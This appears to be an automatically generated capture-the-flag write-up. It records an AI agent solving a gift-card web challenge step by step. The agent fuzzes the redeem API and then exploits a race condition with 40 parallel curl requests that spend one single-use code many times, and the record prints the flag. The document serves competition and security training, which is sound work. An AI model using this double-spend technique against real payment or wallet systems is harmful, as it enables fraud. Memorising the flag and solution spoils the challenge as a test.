# Giftly [HARD]

<!-- SCRIBE: replace this block with a 5-line 'what the trick was' intro. -->

- **Category**: WEB
- **Points**: 400
- **Solves**: 0
- **Flag**: `FLAG{t0ct0u-d0ubl3-sp3nd-r4c3-w1n}`
- **Winner**: `deepseek-flash`
- **Swarm cost**: $0.01 (winner $0.01)
- **Wall time**: 2m01s
- **Traces**: 2

## Description

~~~
Giftly is a gift-card wallet. Each account is issued **one single-use welcome code** worth
100 credits. The reserve vault unlocks at **1000** credits. Make the maths work.
Flag format: `FLAG{...}`
Connection: `http://chal2.hackathon.ke:8021`
~~~

## Trace

| Model | Status | Steps | Cost | Wall | Trace |
|---|---|---:|---:|---:|---|
| `deepseek-flash` | flag_found / CONFIRMED | 23 | $0.01 | 2m01s | `trace-Giftly_[HARD]-deepseek-flash-20261029-185159.jsonl` |
| `claude-opus-4-6` | gave_up | 0 | $0.00 | 7s | `trace-Giftly_[HARD]-claude-opus-4-6-20261029-185159.jsonl` |

_Window: 2026-10-29T18:52:05 to 2026-10-29T18:54:06_

## Solution path

### Step 1: `bash`
~~~
{
  "command": "ls -la /challenge/distfiles/; cat /tools.txt | head -50",
  "timeout_seconds": 60
}
~~~

### Step 2: `bash`
~~~
{
  "command": "curl -s -i http://chal2.hackathon.ke:8021/ | head -40",
  "timeout_seconds": 60
}
~~~

~~~
CTF SANDBOX TOOLS REFERENCE
============================
All tools pre-installed in the sandbox. cat /tools.txt to view this file.

== NETWORKING ==
nc (netcat)        TCP/UDP connections. nc host port <<'EOF' for heredoc sessions.
curl               HTTP client. -s silent, -k skip TLS, -d data, -H header.
wget               HTTP download. wget -O file url.
nmap               Port scanner. nmap -sV host, nmap -p- host.
ffuf               Web fuzzer. ffuf -w wordlist -u http://host/FUZZ
gobuster           Directory/DNS/vhost brute force. gobuster dir -u http://host -w wordlist

== PASSWORD CRACKING ==
hashcat            GPU/CPU hash cracker. hashcat -m 0 -a 0 hashes.txt wordlist.txt
john               John the Ripper. john --wordlist=wordlist hashes.txt

== BINARY ANALYSIS ==
file               Identify file type. file binary
strings            Extract printable strings. strings -n 8 binary
xxd                Hex dump. xxd file | head, xxd -r to reverse.
hexdump            Hex dump. hexdump -C file.
binwalk            Firmware/embedded extraction. binwalk -e file to extract.
objdump            Disassembly. objdump -d binary (from binutils).
... [2000 chars total]
~~~

~~~
HTTP/1.1 200 OK
Server: gunicorn
Date: Thu, 29 Oct 2026 15:52:08 GMT
Connection: keep-alive
Content-Type: text/html; charset=utf-8
Content-Length: 4546

<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Giftly</title>
<style>
  :root{--bg:#fff7fb;--ink:#3a2740;--mut:#9a7fa6;--p1:#ff6ec7;--p2:#ffa45b;--p3:#8a5cf6;--card:#fff;--line:#f1dcec;--ok:#22c55e}
  *{box-sizing:border-box}
  body{margin:0;background:var(--bg);color:var(--ink);font:15px/1.6 "Nunito","Segoe UI",system-ui,-apple-system,sans-serif}
  .hero{background:linear-gradient(120deg,var(--p1),var(--p3) 60%,var(--p2));color:#fff;padding:30px 24px 64px;border-radius:0 0 34px 34px;text-align:center;position:relative;overflow:hidden}
  .hero h1{margin:0;font-size:30px;font-weight:800;letter-spacing:-.5px}
  .hero p{margin:6px 0 0;opacity:.92}
  .hero .gift{font-size:40px}
  .wrap{max-width:540px;margin:-42px auto 40px;padding:0 18px}
  .balcard{background:var(--card);border-radius:22px;box-shadow:0 14px 40px #d9369b22;padding:24px;text-align:center}
... [2000 chars total]
~~~

### Step 3: `bash`
~~~
{
  "command": "curl -s -i http://chal2.hackathon.ke:8021/ | tail -60; echo ====; curl -s -i http://chal2.hackathon.ke:8021/robots.txt; echo; for p in /api /api/ /robots.txt /sitemap.xml /source /app.py; do echo \"== $p\"; curl -s -o /dev/null -w \"%{http_code}\\n\" http://chal2.hackathon.ke:8021$p; done",
  "timeout_seconds": 60
}
~~~

### Step 4: `bash`
~~~
{
  "command": "curl -s -i -c /tmp/cj -b /tmp/cj http://chal2.hackathon.ke:8021/ | sed -n '1,20p'; echo; cat /tmp/cj",
  "timeout_seconds": 60
}
~~~

~~~
.wrap{max-width:540px;margin:-42px auto 40px;padding:0 18px}
  .balcard{background:var(--card);border-radius:22px;box-shadow:0 14px 40px #d9369b22;padding:24px;text-align:center}
  .bal{font-size:46px;font-weight:800;background:linear-gradient(90deg,var(--p3),var(--p1));-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent;line-height:1.1}
  .balcard .cap{color:var(--mut);font-size:13px}
  .code{display:inline-block;margin-top:10px;background:#fdf0f9;border:1px dashed var(--p1);color:var(--p3);font-weight:700;padding:6px 14px;border-radius:999px;letter-spacing:1px}
  .panel{background:var(--card);border-radius:22px;box-shadow:0 8px 26px #d9369b14;padding:22px;margin-top:18px}
  .panel h2{margin:0 0 12px;font-size:16px}
  input{width:100%;padding:13px 15px;border:2px solid var(--line);border-radius:14px;font:inherit;background:#fffafd}
  input:focus{outline:none;border-color:var(--p1)}
  .btns{display:flex;gap:10px;margin-top:14px}
  button{flex:1;border:0;border-radius:14px;padding:13px;font:inherit;font-weight:800;color:#fff;cursor:pointer;background:linear-gradient(120deg,var(--p1),var(--p3));box-shadow:0 6px 16px #ff6ec744}
... [2000 chars total]
~~~

~~~
HTTP/1.1 200 OK
Server: gunicorn
Date: Thu, 29 Oct 2026 15:52:15 GMT
Connection: keep-alive
Content-Type: text/html; charset=utf-8
Content-Length: 4546

<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Giftly</title>
<style>
  :root{--bg:#fff7fb;--ink:#3a2740;--mut:#9a7fa6;--p1:#ff6ec7;--p2:#ffa45b;--p3:#8a5cf6;--card:#fff;--line:#f1dcec;--ok:#22c55e}
  *{box-sizing:border-box}
  body{margin:0;background:var(--bg);color:var(--ink);font:15px/1.6 "Nunito","Segoe UI",system-ui,-apple-system,sans-serif}
  .hero{background:linear-gradient(120deg,var(--p1),var(--p3) 60%,var(--p2));color:#fff;padding:30px 24px 64px;border-radius:0 0 34px 34px;text-align:center;position:relative;overflow:hidden}
  .hero h1{margin:0;font-size:30px;font-weight:800;letter-spacing:-.5px}
  .hero p{margin:6px 0 0;opacity:.92}

# Netscape HTTP Cookie File
# https://curl.se/docs/http-cookies.html
# This file was generated by libcurl! Edit at your own risk.
~~~

### Step 5: `bash`
~~~
{
  "command": "cd /tmp; curl -s -i -c cj -b cj http://chal2.hackathon.ke:8021/api/state; echo; cat cj",
  "timeout_seconds": 60
}
~~~

~~~
HTTP/1.1 200 OK
Server: gunicorn
Date: Thu, 29 Oct 2026 15:52:16 GMT
Connection: keep-alive
Content-Type: application/json
Content-Length: 96
Set-Cookie: sid=0c7a03f63521d05b52641901; Path=/; SameSite=Lax

{"balance":0,"code_used":false,"owned":false,"vault_cost":1000,"welcome_code":"WELCOME-7B9071"}

# Netscape HTTP Cookie File
# https://curl.se/docs/http-cookies.html
# This file was generated by libcurl! Edit at your own risk.

chal2.hackathon.ke	FALSE	/	FALSE	0	sid	0c7a03f63521d05b52641901
~~~

### Step 6: `bash`
~~~
{
  "command": "cd /tmp; for i in 1 2 3; do curl -s -i -c cj$i -b cj$i http://chal2.hackathon.ke:8021/api/state; echo; sleep 1; done",
  "timeout_seconds": 60
}
~~~

~~~
HTTP/1.1 200 OK
Server: gunicorn
Date: Thu, 29 Oct 2026 15:52:18 GMT
Connection: keep-alive
Content-Type: application/json
Content-Length: 96
Set-Cookie: sid=55295d1ca87600aa9fc58559; Path=/; SameSite=Lax

{"balance":0,"code_used":false,"owned":false,"vault_cost":1000,"welcome_code":"WELCOME-B6E1A4"}

HTTP/1.1 200 OK
Server: gunicorn
Date: Thu, 29 Oct 2026 15:52:20 GMT
Connection: keep-alive
Content-Type: application/json
Content-Length: 96
Set-Cookie: sid=e8ec86c05d6331e34ef668b8; Path=/; SameSite=Lax

{"balance":0,"code_used":false,"owned":false,"vault_cost":1000,"welcome_code":"WELCOME-02286F"}

HTTP/1.1 200 OK
Server: gunicorn
Date: Thu, 29 Oct 2026 15:52:21 GMT
Connection: keep-alive
Content-Type: application/json
Content-Length: 96
Set-Cookie: sid=f25adff4354778d8e2753f65; Path=/; SameSite=Lax

{"balance":0,"code_used":false,"owned":false,"vault_cost":1000,"welcome_code":"WELCOME-2D6DA9"}
~~~

### Step 7: `bash`
~~~
{
  "command": "cd /tmp; rm -f cj; curl -s -c cj http://chal2.hackathon.ke:8021/api/state; echo; SID=$(awk '/sid/{print $7}' cj); echo \"SID=$SID\"; CODE=$(curl -s -b cj http://chal2.hackathon.ke:8021/api/state | python3 -c 'import json,sys;print(json.load(sys.stdin)[\"welcome_code\"])'); echo \"CODE=$CODE\"\nfor s in 55295d1c a87600aa 9fc58559; do echo \"== $s\"; curl -s -b \"sid=$s\" http://chal2.hackathon.ke:8021/api/state; echo; done",
  "timeout_seconds": 60
}
~~~

~~~
{"balance":0,"code_used":false,"owned":false,"vault_cost":1000,"welcome_code":"WELCOME-CCD94F"}

SID=72e0bb92f256fcbc2b2856e2
CODE=WELCOME-CCD94F
== 55295d1c
{"balance":0,"code_used":false,"owned":false,"vault_cost":1000,"welcome_code":"WELCOME-1BFE70"}

== a87600aa
{"balance":0,"code_used":false,"owned":false,"vault_cost":1000,"welcome_code":"WELCOME-59B095"}

== 9fc58559
{"balance":0,"code_used":false,"owned":false,"vault_cost":1000,"welcome_code":"WELCOME-F015ED"}
~~~

### Step 8: `bash`
~~~
{
  "command": "cd /tmp; SID=72e0bb92f256fcbc2b2856e2; CODE=WELCOME-CCD94F\ncurl -s -b \"sid=$SID\" -H 'content-type: application/json' -d \"{\\\"code\\\":\\\"$CODE\\\"}\" http://chal2.hackathon.ke:8021/api/redeem; echo\ncurl -s -b \"sid=$SID\" -H 'content-type: application/json' -d \"{\\\"code\\\":\\\"$CODE\\\"}\" http://chal2.hackathon.ke:8021/api/redeem; echo\ncurl -s -b \"sid=$SID\" -X POST http://chal2.hackathon.ke:8021/api/buy; echo\ncurl -s -b \"sid=$SID\" http://chal2.hackathon.ke:8021/api/state; echo",
  "timeout_seconds": 60
}
~~~

~~~
{"balance":100,"ok":true}

{"balance":100,"error":"code already redeemed"}

{"balance":100,"error":"insufficient credits","vault_cost":1000}

{"balance":100,"code_used":true,"owned":false,"vault_cost":1000,"welcome_code":"WELCOME-CCD94F"}
~~~

### Step 9: `bash`
~~~
{
  "command": "cd /tmp; SID=72e0bb92f256fcbc2b2856e2\nt(){ echo \"== $1\"; curl -s -b \"sid=$SID\" -H 'content-type: application/json' -d \"$1\" http://chal2.hackathon.ke:8021/api/redeem; echo; }\nt '{\"code\":\"WELCOME-CCD94F \"}'\nt '{\"code\":\" welcome-ccd94f\"}'\nt '{\"code\":[\"WELCOME-CCD94F\"]}'\nt '{\"code\":{\"a\":1}}'\nt '{\"code\":null}'\nt '{\"code\":true}'\nt '{\"code\":\"WELCOME-CCD94F\",\"amount\":1}'\nt '{\"code\":\"WELCOME-CCD94F\",\"x\":1}'\nt '{}'\nt 'notjson'\nt '{\"code\":\"WELCOME-CCD94F\\x00\"}'\nt '{\"code\":\"WELCOME-CCD94F\\n\"}'\nt '{\"code\":12345}'",
  "timeout_seconds": 60
}
~~~

~~~
== {"code":"WELCOME-CCD94F "}
{"balance":100,"error":"unknown code"}

== {"code":" welcome-ccd94f"}
{"balance":100,"error":"unknown code"}

== {"code":["WELCOME-CCD94F"]}
{"balance":100,"error":"unknown code"}

== {"code":{"a":1}}
{"balance":100,"error":"unknown code"}

== {"code":null}
{"balance":100,"error":"unknown code"}

== {"code":true}
{"balance":100,"error":"unknown code"}

== {"code":"WELCOME-CCD94F","amount":1}
{"balance":100,"error":"code already redeemed"}

== {"code":"WELCOME-CCD94F","x":1}
{"balance":100,"error":"code already redeemed"}

== {}
{"balance":100,"error":"unknown code"}

== notjson
{"balance":100,"error":"unknown code"}

== {"code":"WELCOME-CCD94F\x00"}
{"balance":100,"error":"unknown code"}

== {"code":"WELCOME-CCD94F\n"}
{"balance":100,"error":"unknown code"}

== {"code":12345}
{"balance":100,"error":"unknown code"}
~~~

### Step 10: `bash`
~~~
{
  "command": "cd /tmp; rm -f cj2; SID=$(curl -s -c cj2 http://chal2.hackathon.ke:8021/api/state >/dev/null; awk '/sid/{print $7}' cj2); CODE=$(curl -s -b cj2 http://chal2.hackathon.ke:8021/api/state | python3 -c 'import json,sys;print(json.load(sys.stdin)[\"welcome_code\"])'); echo $SID $CODE\nt(){ echo \"== $1\"; curl -s -b \"sid=$SID\" -H 'content-type: application/json' -d \"$1\" http://chal2.hackathon.ke:8021/api/redeem; echo; }\nt \"{\\\"code\\\":\\\"$CODE\\\",\\\"code\\\":\\\"x\\\"}\"\nt \"{\\\"code\\\":\\\"x\\\",\\\"code\\\":\\\"$CODE\\\"}\"\ncurl -s -b \"sid=$SID\" http://chal2.hackathon.ke:8021/api/state; echo",
  "timeout_seconds": 60
}
~~~

~~~
24494cfa63b6fde80180d48e WELCOME-54FE37
== {"code":"WELCOME-54FE37","code":"x"}
{"balance":0,"error":"unknown code"}

== {"code":"x","code":"WELCOME-54FE37"}
{"balance":100,"ok":true}

{"balance":100,"code_used":true,"owned":false,"vault_cost":1000,"welcome_code":"WELCOME-54FE37"}
~~~

### Step 11: `bash`
~~~
{
  "command": "cd /tmp; for c in \"WELCOME-54fe37\" \"WELCOME 54FE37\" \"WELCOME-54FE37x\" \"WELCOME-54FE3\" \"ELCOME-54FE37\" \"welcome-54FE37\"; do echo \"== $c\"; curl -s -b \"sid=24494cfa63b6fde80180d48e\" -H 'content-type: application/json' -d \"{\\\"code\\\":\\\"$c\\\"}\" http://chal2.hackathon.ke:8021/api/redeem; echo; done",
  "timeout_seconds": 60
}
~~~

~~~
== WELCOME-54fe37
{"balance":100,"error":"unknown code"}

== WELCOME 54FE37
{"balance":100,"error":"unknown code"}

== WELCOME-54FE37x
{"balance":100,"error":"unknown code"}

== WELCOME-54FE3
{"balance":100,"error":"unknown code"}

== ELCOME-54FE37
{"balance":100,"error":"unknown code"}

== welcome-54FE37
{"balance":100,"error":"unknown code"}
~~~

### Step 12: `bash`
~~~
{
  "command": "cd /tmp; SID=24494cfa63b6fde80180d48e\nfor p in buy redeem state; do for m in GET POST PUT OPTIONS HEAD; do echo \"== $m $p\"; curl -s -o /dev/null -w \"%{http_code} \" -X $m -b \"sid=$SID\" -H 'content-type: application/json' -d '{\"code\":\"x\",\"amount\":1000,\"n\":1000,\"value\":1000}' http://chal2.hackathon.ke:8021/api/$p; done; echo; done\necho; curl -s -X POST -b \"sid=$SID\" \"http://chal2.hackathon.ke:8021/api/buy\"; echo\ncurl -s -X POST -b \"sid=$SID\" -H 'content-type: application/json' -d '{\"amount\":1000}' \"http://chal2.hackathon.ke:8021/api/buy\"; echo\ncurl -s -X POST -b \"sid=$SID\" -d 'price=-1000&cost=0' \"http://chal2.hackathon.ke:8021/api/buy\"; echo",
  "timeout_seconds": 60
}
~~~

~~~
== GET buy
405 == POST buy
402 == PUT buy
405 == OPTIONS buy
200 == HEAD buy
405 
== GET redeem
405 == POST redeem
400 == PUT redeem
405 == OPTIONS redeem
200 == HEAD redeem
405 
== GET state
200 == POST state
405 == PUT state
405 == OPTIONS state
200 == HEAD state
200 

{"balance":100,"error":"insufficient credits","vault_cost":1000}

{"balance":100,"error":"insufficient credits","vault_cost":1000}

{"balance":100,"error":"insufficient credits","vault_cost":1000}
~~~

### Step 13: `bash`
~~~
{
  "command": "cd /tmp; SID=24494cfa63b6fde80180d48e\nfor i in $(seq 1 30); do curl -s -X POST -b \"sid=$SID\" http://chal2.hackathon.ke:8021/api/buy; echo; done | sort | uniq -c",
  "timeout_seconds": 60
}
~~~

~~~
30 
     30 {"balance":100,"error":"insufficient credits","vault_cost":1000}
~~~

### Step 14: `bash`
~~~
{
  "command": "cd /tmp; SID=24494cfa63b6fde80180d48e\ncurl -s -X POST -b \"sid=$SID\" -N \"http://chal2.hackathon.ke:8021/api/buy\"; echo ---\ncurl -s -X POST -b \"sid=$SID\" -H 'content-type: application/x-www-form-urlencoded' -d 'a=b' \"http://chal2.hackathon.ke:8021/api/buy\"; echo ---\ncurl -s -X POST -b \"sid=$SID\" -H 'content-type: text/plain' -d 'a=b' \"http://chal2.hackathon.ke:8021/api/buy\"; echo ---\ncurl -s -X POST -b \"sid=$SID\" -H 'content-type: application/json' -d 'null' \"http://chal2.hackathon.ke:8021/api/buy\"; echo ---\ncurl -s -X POST -b \"sid=$SID\" -H 'content-type: application/json' -d '{\"__proto__\":{\"balance\":1000}}' \"http://chal2.hackathon.ke:8021/api/buy\"; echo\ncurl -s -X POST -b \"sid=$SID\" -H 'content-type: application/json' -d '{\"__proto__\":{\"balance\":1000}}' \"http://chal2.hackathon.ke:8021/api/redeem\"; echo",
  "timeout_seconds": 60
}
~~~

~~~
{"balance":100,"error":"insufficient credits","vault_cost":1000}
---
{"balance":100,"error":"insufficient credits","vault_cost":1000}
---
{"balance":100,"error":"insufficient credits","vault_cost":1000}
---
{"balance":100,"error":"insufficient credits","vault_cost":1000}
---
{"balance":100,"error":"insufficient credits","vault_cost":1000}

{"balance":100,"error":"unknown code"}
~~~

### Step 15: `bash`
~~~
{
  "command": "cd /tmp; SID=24494cfa63b6fde80180d48e\nt(){ echo \"== $1\"; curl -s -b \"sid=$SID\" -H 'content-type: application/json' -d \"$1\" http://chal2.hackathon.ke:8021/api/redeem; echo; }\nt '{\"code\":\"WELCOME-CCD94F\"}'\nt '{\"code\":\"WELCOME-B6E1A4\"}'\nt '{\"code\":\"WELCOME-7B9071\"}'\nt '{\"code\":\"WELCOME-1BFE70\"}'\nt '{\"code\":\"WELCOME-000000\"}'\nt '{\"code\":\"WELCOME-FFFFFF\"}'\nt '{\"code\":\"WELCOME-CCD94E\"}'\nt '{\"code\":\"WELCOME-CCD950\"}'",
  "timeout_seconds": 60
}
~~~

~~~
== {"code":"WELCOME-CCD94F"}
{"balance":100,"error":"unknown code"}

== {"code":"WELCOME-B6E1A4"}
{"balance":100,"error":"unknown code"}

== {"code":"WELCOME-7B9071"}
{"balance":100,"error":"unknown code"}

== {"code":"WELCOME-1BFE70"}
{"balance":100,"error":"unknown code"}

== {"code":"WELCOME-000000"}
{"balance":100,"error":"unknown code"}

== {"code":"WELCOME-FFFFFF"}
{"balance":100,"error":"unknown code"}

== {"code":"WELCOME-CCD94E"}
{"balance":100,"error":"unknown code"}

== {"code":"WELCOME-CCD950"}
{"balance":100,"error":"unknown code"}
~~~

### Step 16: `bash`
~~~
{
  "command": "cd /tmp; SID=24494cfa63b6fde80180d48e\ncurl -s -i -X POST -b \"sid=$SID\" -H 'content-type: application/json' -H 'Accept: application/json' -d '{}' http://chal2.hackathon.ke:8021/api/redeem; echo\necho ---; curl -s -i -b \"sid=$SID\" http://chal2.hackathon.ke:8021/api/state; echo\necho ---; curl -s -i -b \"sid=ADMIN\" http://chal2.hackathon.ke:8021/api/state; echo\necho ---; curl -s -i -b \"sid=\" http://chal2.hackathon.ke:8021/api/state; echo\necho ---; curl -s -i -b \"sid=24494cfa63b6fde80180d48e; balance=1000\" http://chal2.hackathon.ke:8021/api/state; echo",
  "timeout_seconds": 60
}
~~~

~~~
HTTP/1.1 400 BAD REQUEST
Server: gunicorn
Date: Thu, 29 Oct 2026 15:53:34 GMT
Connection: keep-alive
Content-Type: application/json
Content-Length: 39

{"balance":100,"error":"unknown code"}

---
HTTP/1.1 200 OK
Server: gunicorn
Date: Thu, 29 Oct 2026 15:53:35 GMT
Connection: keep-alive
Content-Type: application/json
Content-Length: 97

{"balance":100,"code_used":true,"owned":false,"vault_cost":1000,"welcome_code":"WELCOME-54FE37"}

---
HTTP/1.1 200 OK
Server: gunicorn
Date: Thu, 29 Oct 2026 15:53:35 GMT
Connection: keep-alive
Content-Type: application/json
Content-Length: 96
Set-Cookie: sid=b73c1e04eca6ce8eeabe712a; Path=/; SameSite=Lax

{"balance":0,"code_used":false,"owned":false,"vault_cost":1000,"welcome_code":"WELCOME-09DF2E"}

---
HTTP/1.1 200 OK
Server: gunicorn
Date: Thu, 29 Oct 2026 15:53:36 GMT
Connection: keep-alive
Content-Type: application/json
Content-Length: 96
Set-Cookie: sid=863d488493360b2c392307b1; Path=/; SameSite=Lax

{"balance":0,"code_used":false,"owned":false,"vault_cost":1000,"welcome_code":"WELCOME-53C1EB"}

---
HTTP/1.1 200 OK
Server: gunicorn
Date: Thu, 29 Oct 2026 15:53:36 GMT
Connection: keep-alive
Content-Type: application/json
Content-Length: 97

... [1331 chars total]
~~~

### Step 17: `bash`
~~~
{
  "command": "cd /tmp; rm -f a b; \ncurl -s -c a -b a http://chal2.hackathon.ke:8021/api/state > s1.json; cat s1.json; A=$(awk '/sid/{print $7}' a); echo A=$A\nB=$(curl -s -c b http://chal2.hackathon.ke:8021/api/state | python3 -c 'import json,sys;print(json.load(sys.stdin)[\"welcome_code\"])'); echo B=$B\ncat b | tail -1\n# B's own sid:\nBS=$(awk '/sid/{print $7}' b); echo BS=$BS\necho \"== redeem B's code on A\"; curl -s -b a -H 'content-type: application/json' -d \"{\\\"code\\\":\\\"$B\\\"}\" http://chal2.hackathon.ke:8021/api/redeem; echo\ncurl -s -b a http://chal2.hackathon.ke:8021/api/state; echo\necho \"== now redeem on B\"; curl -s -b b -H 'content-type: application/json' -d \"{\\\"code\\\":\\\"$B\\\"}\" http://chal2.hackathon.ke:8021/api/redeem; echo",
  "timeout_seconds": 60
}
~~~

~~~
{"balance":0,"code_used":false,"owned":false,"vault_cost":1000,"welcome_code":"WELCOME-98B18F"}
A=fe856e2fd045540844d0e911
B=WELCOME-7AD942
chal2.hackathon.ke	FALSE	/	FALSE	0	sid	08e2ef3bac23aaade409129b
BS=08e2ef3bac23aaade409129b
== redeem B's code on A
{"balance":0,"error":"unknown code"}

{"balance":0,"code_used":false,"owned":false,"vault_cost":1000,"welcome_code":"WELCOME-98B18F"}

== now redeem on B
{"balance":100,"ok":true}
~~~

### Step 18: `bash`
~~~
{
  "command": "cd /tmp; for i in $(seq 1 5); do S=$(curl -s -c x -D h http://chal2.hackathon.ke:8021/api/state | python3 -c 'import json,sys;d=json.load(sys.stdin);print(d[\"welcome_code\"])'); grep -i '^set-cookie' h; echo $S; done",
  "timeout_seconds": 60
}
~~~

~~~
Set-Cookie: sid=39e6b80b822802248ac32b69; Path=/; SameSite=Lax
WELCOME-C1E79F
Set-Cookie: sid=fa07cdda43a1c1de9d35eeab; Path=/; SameSite=Lax
WELCOME-92A158
Set-Cookie: sid=3d13b36ac74a3e06214ee787; Path=/; SameSite=Lax
WELCOME-97A7D9
Set-Cookie: sid=1a4670084e52938e0a1266fd; Path=/; SameSite=Lax
WELCOME-95A1D7
Set-Cookie: sid=657f03704f23c0502203c45f; Path=/; SameSite=Lax
WELCOME-5922C9
~~~

### Step 19: `bash`
~~~
{
  "command": "cd /tmp; curl -s -i -X POST -b a -H 'content-type: application/json' -d '{}' http://chal2.hackathon.ke:8021/api/redeem; echo; curl -s -i -X POST -H 'content-type: application/json' -d '{}' http://chal2.hackathon.ke:8021/api/redeem; echo; echo ==; curl -s -i -X POST -H 'content-type: application/json' -d '{}' http://chal2.hackathon.ke:8021/api/buy",
  "timeout_seconds": 60
}
~~~

~~~
HTTP/1.1 400 BAD REQUEST
Server: gunicorn
Date: Thu, 29 Oct 2026 15:53:47 GMT
Connection: keep-alive
Content-Type: application/json
Content-Length: 37

{"balance":0,"error":"unknown code"}

HTTP/1.1 400 BAD REQUEST
Server: gunicorn
Date: Thu, 29 Oct 2026 15:53:48 GMT
Connection: keep-alive
Content-Type: application/json
Content-Length: 37
Set-Cookie: sid=48df52e4bb4adc652dbd5627; Path=/; SameSite=Lax

{"balance":0,"error":"unknown code"}

==
HTTP/1.1 402 PAYMENT REQUIRED
Server: gunicorn
Date: Thu, 29 Oct 2026 15:53:49 GMT
Connection: keep-alive
Content-Type: application/json
Content-Length: 63

{"balance":0,"error":"insufficient credits","vault_cost":1000}
~~~

### Step 20: `bash`
~~~
{
  "command": "cd /tmp; for i in $(seq 1 20); do curl -s -H 'content-type: application/json' -d \"{\\\"code\\\":\\\"WELCOME-$i\\\"}\" http://chal2.hackathon.ke:8021/api/redeem; echo; done | sort | uniq -c",
  "timeout_seconds": 60
}
~~~

~~~
20 
     20 {"balance":0,"error":"unknown code"}
~~~

### Step 21: `bash`
~~~
{
  "command": "cd /tmp; rm -f a; A=$(curl -s -c a http://chal2.hackathon.ke:8021/api/state | python3 -c 'import json,sys;print(json.load(sys.stdin)[\"welcome_code\"])'); SID=$(awk '/sid/{print $7}' a); echo $SID $A\nfor i in $(seq 1 40); do (curl -s -b \"sid=$SID\" -H 'content-type: application/json' -d \"{\\\"code\\\":\\\"$A\\\"}\" http://chal2.hackathon.ke:8021/api/redeem; echo) & done | sort | uniq -c; wait\ncurl -s -b \"sid=$SID\" http://chal2.hackathon.ke:8021/api/state; echo",
  "timeout_seconds": 60
}
~~~

~~~
a8285ecfcafe85e65c8c647b WELCOME-C83FC4
     40 
      1 {"balance":100,"ok":true}
      1 {"balance":1000,"ok":true}
      1 {"balance":1100,"ok":true}
     16 {"balance":1200,"error":"code already redeemed"}
      1 {"balance":1200,"ok":true}
      1 {"balance":1300,"ok":true}
      1 {"balance":1400,"ok":true}
      1 {"balance":1500,"ok":true}
      1 {"balance":1600,"ok":true}
      1 {"balance":1700,"ok":true}
      1 {"balance":200,"ok":true}
      1 {"balance":300,"error":"code already redeemed"}
      1 {"balance":300,"ok":true}
      1 {"balance":400,"ok":true}
      2 {"balance":500,"error":"code already redeemed"}
      1 {"balance":500,"ok":true}
      1 {"balance":600,"error":"code already redeemed"}
      1 {"balance":600,"ok":true}
      3 {"balance":700,"error":"code already redeemed"}
      1 {"balance":700,"ok":true}
      1 {"balance":800,"ok":true}
      1 {"balance":900,"ok":true}
{"balance":1700,"code_used":true,"owned":false,"vault_cost":1000,"welcome_code":"WELCOME-C83FC4"}
~~~

### Step 22: `bash`
~~~
{
  "command": "cd /tmp; curl -s -X POST -b \"sid=a8285ecfcafe85e65c8c647b\" http://chal2.hackathon.ke:8021/api/buy; echo",
  "timeout_seconds": 60
}
~~~

~~~
{"balance":1700,"ok":true,"vault":{"flag":"FLAG{t0ct0u-d0ubl3-sp3nd-r4c3-w1n}","item":"giftly-reserve"}}
~~~

### Step 23: `submit_flag`
~~~
{
  "flag": "FLAG{t0ct0u-d0ubl3-sp3nd-r4c3-w1n}"
}
~~~

~~~
DRY RUN — would submit "FLAG{t0ct0u-d0ubl3-sp3nd-r4c3-w1n}" but --no-submit is set.
~~~

## Result

- **Flag**: `FLAG{t0ct0u-d0ubl3-sp3nd-r4c3-w1n}`
- **Confirmed by CTFd**: yes
- **Cost**: $0.01 (winner), $0.01 (whole swarm)
- **Wall time**: 2m01s
- **Generated**: 2026-10-30T00:14:55
